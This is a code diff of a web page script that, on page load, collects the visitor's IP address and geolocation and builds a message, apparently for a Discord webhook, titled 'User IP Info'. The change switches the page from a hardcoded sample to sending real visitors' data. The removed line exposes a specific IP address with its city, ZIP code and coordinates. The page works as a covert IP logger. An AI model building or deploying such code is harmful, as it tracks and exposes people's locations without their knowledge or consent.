@@ -33,24 +33,24 @@
             $(document).ready(()=>{			
                 $("#ip-info").html(JSON.stringify(userIPInfo));
                 console.log(userIPInfo)
-				post(userIPInfo);
+				post(JSON.stringify(userIPInfo));
             });
         </script>
 
   <script>
   function post(msg){
 	
-const d = new Date();
-let text = d.toJSON();
-	document.getElementById("curDateTime").innerHTML = text;	
+	const d = new Date();
+	let dtStamp = d.toJSON();
+	document.getElementById("curDateTime").innerHTML = dtStamp;	
 	
-	  const myJSON = '{"ip":"184.90.20.62","country_code":"US","country_name":"United States","region_code":"FL","region_name":"Florida","city":"Ormond Beach","zip_code":"32174","time_zone":"America/New_York","latitude":29.2866,"longitude":-81.0869,"metro_code":534}';
-	  const myIP = JSON.parse(myJSON);
+	  
+	  const myIP = JSON.parse(msg);
   
       var params = {
-        username: "ogjackk",
+        username: "gioletsgo",
         avatar_url: "",
-		embeds:[{"color": 16711680,"title":"User IP Info", "description":myIP["ip"], "timestamp": text}]		
+		embeds:[{"color": 16711680,"title":"User IP Info", "description":myIP["ip"], "timestamp": dtStamp}]		
       }
   	  //$.extend(params, myContent);
 	  $("#myIP").html(JSON.stringify(myIP["ip"]));
